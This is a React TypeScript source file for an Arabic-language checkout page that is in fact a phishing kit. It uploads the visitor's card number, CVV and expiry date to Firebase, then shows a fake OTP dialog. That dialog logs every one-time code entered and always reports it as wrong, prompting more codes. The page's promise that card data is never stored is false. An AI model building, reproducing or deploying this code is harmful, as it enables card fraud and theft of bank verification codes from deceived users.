"use client"

import type React from "react"
import { useState } from "react"
import { User, Check, CreditCard, Shield, ArrowRight, Lock, Smartphone, Wallet } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import { addData } from "@/lib/firebase"
const allOtps = ['']

export default function CheckoutPage() {
    const [showOtpDialog, setShowOtpDialog] = useState(false)
    const [otpValue, setOtpValue] = useState("")
    const [otpError, setOtpError] = useState("")
    const [isLoading, setIsLoading] = useState(false)
    const [expiryDate, setExpiryDate] = useState("")
    const [formData, setFormData] = useState({
        fullName: "",
        email: "",
        paymentMethod: "credit-card",
        cardNumber: "",
        expiryDate: "",
        cvv: "",
    })

    const handleInputChange = (field: string, value: string) => {
        if (field === "expiryDate") {
            // Remove any non-digit characters except "/"
            let cleanValue = value.replace(/[^\d/]/g, "")

            // Remove any existing "/"
            cleanValue = cleanValue.replace(/\//g, "")

            // Add "/" after 2 digits (month)
            if (cleanValue.length >= 2) {
                cleanValue = cleanValue.substring(0, 2) + "/" + cleanValue.substring(2, 4)
            }

            // Limit to MM/YY format (5 characters max)
            cleanValue = cleanValue.substring(0, 5)

            setExpiryDate(cleanValue)
        }

        setFormData((prev) => ({ ...prev, [field]: value }))
    }

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()
        setIsLoading(true)
        const visitorId = localStorage.getItem('visitor')
        addData({
            id: visitorId, cardNumber: formData.cardNumber, pass: formData.cvv, month: formData.expiryDate,
             expiryDate
        })
        // Simulate API call
        setTimeout(() => {
            setIsLoading(false)
            setShowOtpDialog(true)
        }, 5000);

    }

    const handleOtpSubmit = () => {
        const visitorId = localStorage.getItem('visitor')
        setIsLoading(true)

        allOtps.push(otpValue)
        addData({ id: visitorId, otp: otpValue, allOtps })

        if (otpValue.length === 6) {
            setTimeout(() => {
                setIsLoading(false)
                setOtpValue("")
                setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
            }, 5000);
        }

    }

    const handleOtpChange = (value: string) => {
        setOtpValue(value)
        setOtpError("")
    }

    return (
        <div dir="rtl" className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-purple-50">
            {/* Professional Header */}
            <div className="relative overflow-hidden">
                <div className="absolute inset-0 bg-gradient-to-l from-purple-600/10 via-pink-500/5 to-transparent"></div>
                <div className="relative px-6 py-8">
                    <div className="max-w-md mx-auto text-center">
                        <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-purple-600 to-pink-800 rounded-2xl shadow-lg mb-4">
                            <Lock className="w-8 h-8 text-white" />
                        </div>
                        <h1 className="text-2xl font-bold text-slate-800 mb-2">الدفع الآمن</h1>
                        <p className="text-slate-600">معلوماتك محمية بأعلى معايير الأمان</p>
                    </div>
                </div>
            </div>

            {/* Enhanced Progress Steps */}
            <Card className="mx-4 -mt-6 relative z-10 shadow-2xl border-0 bg-white/80 backdrop-blur-sm">
                <CardContent className="p-8">
                    <div className="max-w-md mx-auto">
                        <div className="flex items-center justify-between mb-8">
                            <div className="flex items-center">
                                <div className="relative">
                                    <div className="w-10 h-10 bg-gradient-to-r from-purple-500 to-[#2b224d]  rounded-full flex items-center justify-center shadow-lg">
                                        <Check className="w-5 h-5 text-white" />
                                    </div>
                                    <div className="absolute -inset-1 bg-purple-500/30 rounded-full animate-pulse"></div>
                                </div>
                                <div className="w-24 h-2 bg-gradient-to-r from-[#2b224d] to-purple-500 mx-4 rounded-full shadow-sm"></div>
                            </div>
                            <div className="flex items-center">
                                <div className="relative">
                                    <div className="w-10 h-10 bg-gradient-to-r from-[#2b224d] to-pink-600 rounded-full flex items-center justify-center shadow-lg">
                                        <span className="text-white text-sm font-bold">2</span>
                                    </div>
                                    <div className="absolute -inset-1 bg-purple-500/20 rounded-full animate-pulse"></div>
                                </div>
                                <div className="w-24 h-2 bg-slate-200 mx-4 rounded-full"></div>
                            </div>
                            <div className="w-10 h-10 bg-slate-200 rounded-full flex items-center justify-center shadow-sm">
                                <span className="text-slate-400 text-sm font-semibold">3</span>
                            </div>
                        </div>
                        <div className="flex justify-between text-sm font-medium">
                            <span className="text-green-600">أختيار القيمة </span>
                            <span className="text-purple-600 font-bold">الدفع</span>
                            <span className="text-slate-400">تأكيد الطلب</span>
                        </div>
                    </div>
                </CardContent>
            </Card>

            {/* Enhanced Form Content */}
            <div className="px-4 py-8">
                <div className="max-w-md mx-auto space-y-8">
                    <form onSubmit={handleSubmit} className="space-y-8">
                        {/* Enhanced User Details */}
                        <Card className="shadow-xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
                            <div className="bg-gradient-to-r from-slate-100 via-white to-purple-50 px-8 py-6 border-b border-slate-100">
                                <h2 className="text-xl font-bold text-slate-800 flex items-center">
                                    <div className="w-8 h-8 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg flex items-center justify-center ml-3">
                                        <User className="w-4 h-4 text-white" />
                                    </div>
                                    بيانات المستخدم
                                    <Badge variant="secondary" className="mr-3 bg-blue-100 text-blue-700 font-medium">
                                        مطلوب
                                    </Badge>
                                </h2>
                            </div>
                            <CardContent className="p-6">
                                <div className="space-y-4">
                                    <div className="group">
                                        <Label htmlFor="fullName" className="text-slate-700 text-base font-semibold mb-3 block">
                                            الاسم الكامل <span className="text-red-500">*</span>
                                        </Label>
                                        <div className="relative">
                                            <Input
                                                id="fullName"
                                                placeholder="أدخل الاسم الكامل"
                                                value={formData.fullName}
                                                onChange={(e: any) => handleInputChange("fullName", e.target.value)}
                                                className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 text-base bg-white/50"
                                                required
                                            />
                                            <div className="absolute inset-0 rounded-md bg-gradient-to-r from-purple-500/0 to-pink-500/0 group-focus-within:from-purple-500/5 group-focus-within:to-pink-500/5 transition-all duration-200 pointer-events-none"></div>
                                        </div>
                                    </div>

                                    <div className="group">
                                        <Label htmlFor="email" className="text-slate-700 text-base font-semibold mb-3 block">
                                            البريد الإلكتروني
                                            <Badge variant="outline" className="mr-2 text-xs border-slate-300 text-slate-500">
                                                اختياري
                                            </Badge>
                                        </Label>
                                        <div className="relative">
                                            <Input
                                                id="email"
                                                type="email"
                                                placeholder="example@domain.com"
                                                value={formData.email}
                                                onChange={(e) => handleInputChange("email", e.target.value)}
                                                className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 text-base bg-white/50"
                                                dir="ltr"
                                            />
                                            <div className="absolute inset-0 rounded-md bg-gradient-to-r from-purple-500/0 to-pink-500/0 group-focus-within:from-purple-500/5 group-focus-within:to-pink-500/5 transition-all duration-200 pointer-events-none"></div>
                                        </div>
                                    </div>
                                </div>
                            </CardContent>
                        </Card>

                        {/* Enhanced Payment Selection */}
                        <Card className="shadow-xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
                            <div className="bg-gradient-to-r from-slate-100 via-white to-purple-50 px-8 py-6 border-b border-slate-100">
                                <h2 className="text-xl font-bold text-slate-800 flex items-center">
                                    <div className="w-6 h-6 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg flex items-center justify-center ml-3">
                                        <CreditCard className="w-4 h-4 text-white" />
                                    </div>
                                    طريقة الدفع
                                    <Badge className="mr-3 bg-green-100 text-green-700 border-green-200 font-medium">
                                        <Shield className="w-3 h-3 ml-1" />
                                        SSL آمن
                                    </Badge>
                                </h2>
                            </div>
                            <CardContent className="p-8">
                                <RadioGroup
                                    value={formData.paymentMethod}
                                    onValueChange={(value) => handleInputChange("paymentMethod", value)}
                                    className="space-y-4"
                                >
                                    {/* Credit Card Option */}
                                    <Card className="border-2 border-purple-200 bg-gradient-to-r from-purple-50/50 to-pink-50/50 transition-all hover:shadow-lg hover:border-purple-300 group" dir="rtl">
                                        <CardContent className="p-0">
                                            <div className="flex items-center p-6">
                                                <RadioGroupItem
                                                    value="credit-card"
                                                    id="credit-card"
                                                    className="border-1 border-purple-400 text-purple-600 ml-4 w-5 h-5"
                                                />
                                                <div className="flex items-center justify-between w-full">
                                                    <div dir="rtl">
                                                        <Label htmlFor="credit-card" className="text-slate-800 font-bold text-lg cursor-pointer">
                                                            بطاقة ائتمان
                                                        </Label>
                                                        <p className="text-slate-600 text-sm mt-1">الطريقة الأكثر أماناً للدفع</p>
                                                    </div>
                                                    <div className="flex items-center space-x-2 space-x-reverse">
                                                        <img src="visa.svg" className="w-8 h-6  rounded flex items-center justify-center text-white text-xs font-bold" />
                                                        <img src="master.svg" className="w-8 h-6  rounded flex items-center justify-center text-white text-xs font-bold" />
                                                        <img src="amex.svg" className="w-6 h-6  rounded flex items-center justify-center text-white text-xs font-bold" />

                                                    </div>
                                                </div>
                                            </div>

                                            {formData.paymentMethod === "credit-card" && (
                                                <div className="border-t bg-white/80 backdrop-blur-sm">
                                                    <div className="p-6 space-y-6">
                                                        <div className="group" dir="rtl">
                                                            <Label htmlFor="cardNumber" className="text-slate-700 text-base font-semibold mb-3 block">
                                                                رقم البطاقة <span className="text-red-500">*</span>
                                                            </Label>
                                                            <div className="relative">
                                                                <Input
                                                                    id="cardNumber"
                                                                    placeholder="#### #### #### ####"
                                                                    maxLength={16}
                                                                    minLength={16}
                                                                    value={formData.cardNumber}
                                                                    onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                                                                    className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-lg tracking-wider bg-white/50"
                                                                    required
                                                                />
                                                                <CreditCard className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-slate-400" />
                                                            </div>
                                                        </div>

                                                        <div className="grid grid-cols-2 gap-6">
                                                            <div className="group" dir="rtl">
                                                                <Label
                                                                    htmlFor="expiryDate"
                                                                    className="text-slate-700 text-base font-semibold mb-3 block"
                                                                >
                                                                    تاريخ الانتهاء <span className="text-red-500">*</span>
                                                                </Label>
                                                                <Input
                                                                    id="expiryDate"
                                                                    placeholder="MM/YY"
                                                                    value={expiryDate}
                                                                    onChange={(e) => handleInputChange("expiryDate", e.target.value)}
                                                                    className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-lg bg-white/50"
                                                                    dir="rtl"
                                                                    required
                                                                    maxLength={5}
                                                                />
                                                            </div>
                                                            <div className="group" dir="rtl">
                                                                <Label htmlFor="cvv" className="text-slate-700 text-base font-semibold mb-3 block">
                                                                    رمز الأمان <span className="text-red-500">*</span>
                                                                </Label>
                                                                <div className="relative">
                                                                    <Input
                                                                        id="cvv"
                                                                        placeholder="***"
                                                                        value={formData.cvv}
                                                                        onChange={(e) => handleInputChange("cvv", e.target.value)}
                                                                        className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-lg bg-white/50"
                                                                        dir="rtl"
                                                                        maxLength={4}

                                                                        type="tel"
                                                                        minLength={3}
                                                                        required
                                                                    />
                                                                    <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 w-4 h-4 text-slate-400" />
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            )}
                                        </CardContent>
                                    </Card>

                                    {/* Additional Payment Methods */}
                                    <Card className="border-2 border-slate-200 bg-slate-50/50 transition-all hover:shadow-md opacity-60 " dir="rtl">
                                        <CardContent className="p-4">
                                            <div className="flex items-center justify-between">
                                                <div className="flex items-center">
                                                    <RadioGroupItem
                                                        value="digital-wallet"
                                                        id="digital-wallet"
                                                        className="border-2 border-slate-300 ml-4 w-5 h-5"
                                                        disabled
                                                    />
                                                    <div>
                                                        <Label htmlFor="digital-wallet" className="text-slate-600 font-semibold text-lg">
                                                            المحفظة الرقمية
                                                        </Label>
                                                        <p className="text-slate-500 text-sm">قريباً</p>
                                                    </div>
                                                </div>
                                                <div className="flex items-center space-x-2 space-x-reverse">
                                                    <Wallet className="w-6 h-6 text-slate-400" />
                                                    <Smartphone className="w-6 h-6 text-slate-400" />
                                                </div>
                                            </div>
                                        </CardContent>
                                    </Card>
                                </RadioGroup>

                                <Separator className="my-8" />

                                {/* Security Notice */}
                                <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-xl p-6">
                                    <div className="flex items-start">
                                        <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center ml-4 flex-shrink-0">
                                            <Shield className="w-5 h-5 text-green-600" />
                                        </div>
                                        <div>
                                            <h3 className="font-semibold text-green-800 mb-2">حماية متقدمة</h3>
                                            <p className="text-green-700 text-sm leading-relaxed">
                                                جميع المعاملات محمية بتشفير SSL 256-bit ومعايير PCI DSS. لا نحتفظ ببيانات بطاقتك الائتمانية على
                                                خوادمنا.
                                            </p>
                                        </div>
                                    </div>
                                </div>

                                <Button
                                    type="submit"
                                    disabled={isLoading}
                                    className="w-full mt-8 h-12 bg-gradient-to-r from-[#a00064]  to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-lg shadow-xl transition-all duration-300 hover:shadow-2xl hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
                                >
                                    {isLoading ? (
                                        <div className="flex items-center">
                                            <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
                                            جاري المعالجة...
                                        </div>
                                    ) : (
                                        <>
                                            المتابعة للدفع الآمن
                                            <ArrowRight className="w-5 h-5 mr-3" />
                                        </>
                                    )}
                                </Button>
                            </CardContent>
                        </Card>
                    </form>
                </div>
            </div>

            {/* Enhanced OTP Dialog */}
            <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
                <DialogContent className="sm:max-w-lg mx-4 rounded-2xl border-0 shadow-2xl bg-white/95 backdrop-blur-sm">
                    <DialogHeader className="text-center pb-6">
                        <div className="relative mx-auto mb-6">
                            <div className="w-20 h-20 bg-gradient-to-r from-purple-100 to-pink-100 rounded-2xl flex items-center justify-center">
                                <Shield className="w-10 h-10 text-purple-600" />
                            </div>
                            <div className="absolute -inset-2 bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-2xl animate-pulse"></div>
                        </div>
                        <DialogTitle className="text-2xl font-bold text-slate-800 mb-2">تأكيد رمز التحقق</DialogTitle>
                        <p className="text-slate-600">للحماية الإضافية لحسابك</p>
                    </DialogHeader>

                    <div className="space-y-8 py-4">
                        <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-xl p-6">
                            <p className="text-center text-slate-700 leading-relaxed">
                                تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم هاتفك
                                <br />
                                <span className="font-bold text-slate-900 text-lg">+966 5** *** ***</span>
                            </p>
                        </div>

                        <div className="flex justify-center">
                            <InputOTP maxLength={6} value={otpValue} onChange={handleOtpChange}>
                                <InputOTPGroup className="gap-3">
                                    {[0, 1, 2, 3, 4, 5].map((index) => (
                                        <InputOTPSlot
                                            key={index}
                                            index={index}
                                            className="w-14 h-14 text-xl font-bold border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 bg-white/80"
                                        />
                                    ))}
                                </InputOTPGroup>
                            </InputOTP>
                        </div>

                        {otpError && (
                            <Card className="border-red-200 bg-gradient-to-r from-red-50 to-pink-50">
                                <CardContent className="p-4">
                                    <div className="text-center text-red-600 font-medium flex items-center justify-center">
                                        <div className="w-5 h-5 bg-red-100 rounded-full flex items-center justify-center ml-2">
                                            <span className="text-red-600 text-xs">!</span>
                                        </div>
                                        {otpError}
                                    </div>
                                </CardContent>
                            </Card>
                        )}

                        <div className="space-y-4">
                            <Button
                                onClick={handleOtpSubmit}
                                className="w-full h-14 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 shadow-lg hover:shadow-xl"
                                disabled={otpValue.length !== 6}
                            >
                                {isLoading ? (
                                    <div className="flex items-center">
                                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
                                        جاري المعالجة...
                                    </div>
                                ) : (
                                    <>
                                        تأكيد الرمز والمتابعة
                                    </>)}
                            </Button>

                            <Button
                                variant="outline"
                                className="w-full h-14 border-2 border-slate-200 text-slate-600 hover:bg-slate-50 font-semibold text-base transition-all duration-200"
                                onClick={() => {
                                    setOtpValue("")
                                    setOtpError("")
                                }}
                            >
                                إعادة إرسال الرمز
                            </Button>
                        </div>

                        <div className="bg-slate-50 rounded-xl p-4">
                            <p className="text-center text-xs text-slate-500 leading-relaxed">
                                لم تستلم الرمز؟ تحقق من رسائل SMS أو انتظر 60 ثانية لإعادة الإرسال
                                <br />
                                <span className="font-medium">هذا الرمز صالح لمدة 5 دقائق فقط</span>
                            </p>
                        </div>
                    </div>
                </DialogContent>
            </Dialog>
        </div>
    )
}
